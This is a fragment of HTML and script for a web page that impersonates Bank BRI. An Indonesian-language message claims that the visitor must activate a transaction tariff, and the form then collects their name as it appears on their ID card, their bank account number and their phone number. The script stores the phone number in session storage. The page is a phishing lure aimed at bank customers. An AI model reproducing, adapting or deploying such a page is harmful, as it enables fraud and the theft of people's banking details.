...
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
		<link rel="icon" href="img/brimo_logo1.png"<div></div>
...
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCvyB-3oxGbSKhFMeglinfZ0dThibokL47W0aF9kccwBW1s6fxs8CyXQj4jBQHRVfj-2v6fq9dOUrf7UJUax9EWxfU3rR5iozqtjg8dtH7ls6tYlEuXZebRDjP4DVoatqaHiFBe4evVfVWfqjoufaSdQtJ1FNDh0-5184SZ1AqSe4shQDB4-iGAXx0dto/s1079/Screenshot_2024-02-21-12-22-34-61_f0d5010b4078101d669cabe708845c5e.jpg" width="100%">
...
<div class="" style="margin-left: 20px;margin-top: 20px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px; background: #fff; height: 205px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden; overflow-x: hidden">
<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px"><p>𝗨𝗻𝘁𝘂𝗸 𝗺𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗸𝗮𝗻 𝗽𝗿𝗼𝘀𝗲𝘀 𝗮𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝘁𝗮𝗿𝗶𝗳 𝘁𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗮𝗻𝗱𝗮, 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗱𝗮𝘁𝗮 𝗱𝗶 𝗯𝗮𝘄𝗮𝗵 𝗶𝗻𝗶</p><br><hr>

</center>

  <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
<input type="hidden" id="nomorku" name="nomorku">
<h5 style="color:#09559a; margin-top: 5px; margin-left: 4px">Atas nama :</h5>
<input id="nama" name="nama" type="text" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: #; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 15px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none;" placeholder="Nama sesuai KTP"  required>
</h3>
<br>

<h5 style="color:#09559a; margin-top: 7px; margin-left: 4px">Nomor rekening :</h5>
<input id="norek" name="rek" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255); border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 15px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none;" placeholder="#####"  required>
<br><br>
</div>
<div>
<br>
...
document.getElementById("nomorku").value = NoHp + "";
...
var nomorku = document.getElementById("nomorku").value;
sessionStorage.setItem("nomorku", nomorku);
